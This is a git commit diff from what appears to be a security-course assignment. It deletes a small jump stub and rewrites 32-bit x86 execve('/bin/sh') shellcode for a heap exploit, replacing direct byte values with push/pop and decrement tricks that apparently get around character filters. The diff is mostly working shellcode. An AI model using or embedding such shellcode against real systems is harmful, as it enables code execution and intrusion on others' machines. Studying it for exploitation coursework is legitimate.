0af0181a393c5290aff846a18e5be0dea8f7249c
jsfr <jfrdev@gmail.com>
2014-06-14 21:10:48 +0200

    removed unnecessary files and fixed the heap exploit

--- handout/week7-final/assignment/www-setup.asm
+++
@@ -1,3 +0,0 @@
-lea eax, [ebp-0x18]
-add eax, 0x36
-call eax
--- handout/week7-final/assignment/www-shellcode.asm
+++ handout/week7-final/assignment/www-shellcode.asm
@@ -1,18 +1,48 @@
 [bits 32]
 
 	; envp = NULL
-	xor edx, edx
+	push byte 0x01
+	pop edx
+	dec edx ; this also sets ZF = 0
+
+	jz short +0x13
+	inc ecx
+	inc ecx
+	inc ecx
+	inc ecx
+	inc ecx
+	inc ecx
+	inc ecx
+	inc ecx
+	inc ecx
+	inc ecx
+	inc ecx
+	inc ecx
+	inc ecx
+	inc ecx
+	inc ecx
+	inc ecx
 
 	; filename = "/bin/sh"
 	push byte 0x68
-	push word 0x732f
-	push dword 0x6e69622f
-	mov ebx, esp
+	push word 0x7330
+	pop ebx
+	dec ebx
+	push ebx
+
+	push dword 0x6e696230
+	pop ebx
+	dec ebx
+	push ebx
+
+	push esp
+	pop ebx
 
 	; argv = { filename, NULL }
 	push edx  ; NULL
 	push ebx  ; "/bin/sh"
-	mov ecx, esp
+	push esp
+	pop ecx
 
 	; syscall execve
 	push byte 11
